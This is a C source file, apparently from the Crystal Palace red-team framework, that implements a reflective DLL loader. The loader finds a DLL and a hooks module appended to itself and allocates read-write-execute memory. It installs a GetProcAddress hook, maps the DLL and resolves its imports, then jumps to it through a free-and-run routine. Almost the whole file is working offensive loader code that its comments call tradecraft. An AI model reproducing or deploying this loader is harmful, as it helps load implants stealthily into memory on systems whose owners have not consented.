/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
 
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 
/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));
char __HOKDATA__[0] __attribute__((section("my_hooks")));
 
char * findAppendedDLL() {
    return (char *)&__DLLDATA__;
}
 
char * findAppendedHOOKS() {
    return (char *)&__HOKDATA__;
}
 
/*
 * Our PICO loader, have fun, go nuts!
 */
char * SetupCOFF(IMPORTFUNCS * funcs, char * srcData) {
    char * dstCode = NULL;
    char * dstData = NULL;
 
    /* allocate memory, we're combining everything into one memory region */
    dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(srcData) + PicoDataSize(srcData), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    dstData = dstCode + PicoCodeSize(srcData);
 
    /* load our pico into our destination address, thanks! */
    PicoLoad(funcs, srcData, dstCode, dstData);
 
    return dstCode;
}
 
// exported function for freeAndRun
typedef void (*PICOMAIN_FUNC_3)(char * loader, char * dllEntry, char * dllBase);
 
/*
 * Get the start address of our PIC DLL loader.
 * (defined with our separate tradecraft)
 */
char * getStart();
 
/* this is the linker intrinsic() to get the tag for our exported free and run function */
int __tag_freeandrun();
 
/*
 * This is an empty function, but we will use redirect to LAYER setupHooks from our modules on top of this.
 */
void setupHooks(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll) {
}
 
/*
 * Our reflective loader itself, have fun, go nuts!
 */
void init() {
    char       * srcdll;
    char       * dstdll;
    char       * srchooks;
    char       * dsthooks;
    DLLDATA      data;
    IMPORTFUNCS  funcs;
 
    /* find our DLL appended to this PIC */
    srcdll = findAppendedDLL();
 
    /* resolve the functions we'll need */
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;
 
    /* parse our DLL! */
    ParseDLL(srcdll, &data);
 
    /* allocate memory for our DLL and the other stuff within our layout.  */
    dstdll = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
    /* Before we go ANY further, let's setup our hooks PICO */
    srchooks = findAppendedHOOKS();
    dsthooks = SetupCOFF(&funcs, srchooks);
 
    /* Our hooks PICO will hook GetProcAddres within funcs, so it takes effect on LoadDLL */
    PicoEntryPoint(srchooks, dsthooks)((char *)&funcs);
 
    /* Run our hook setup logic (tradecraft specific) */
    setupHooks(srchooks, dsthooks, &data, dstdll);
 
    /* load the damned DLL */
    LoadDLL(&data, srcdll, dstdll);
 
    /* process the imports */
    ProcessImports(&funcs, &data, dstdll);
 
    /* run DLL via our freeAndRun (free.c) exported function merged into our hooks PICO */
    ((PICOMAIN_FUNC_3)PicoGetExport(srchooks, dsthooks, __tag_freeandrun())) (getStart(), (char *)EntryPoint(&data, dstdll), dstdll);
}
 
/*
 * Our entry point for the loader. init() is a join point for any setup functionality (e.g., redirect "init" "_my_init")
 */
void go() {
    init();
}
 
char * getStart() {
    return (char *)go;
}